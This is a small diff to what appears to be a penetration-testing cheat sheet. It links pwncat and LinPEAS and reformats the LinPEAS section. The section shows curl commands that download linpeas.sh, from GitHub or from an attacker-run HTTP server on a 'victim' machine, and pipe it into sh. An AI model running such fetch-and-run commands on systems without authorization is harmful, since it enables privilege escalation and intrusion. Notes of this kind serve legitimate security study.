@@ -11,10 +11,9 @@ https://github.com/cytopia/pwncat
 ##### Linpeas
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
-    From github
     curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
     
-    Local network
+ ###### Local network
     sudo python -m SimpleHTTPServer 80 #Host
     curl 10.10.10.10/linpeas.sh | sh #Victim
 
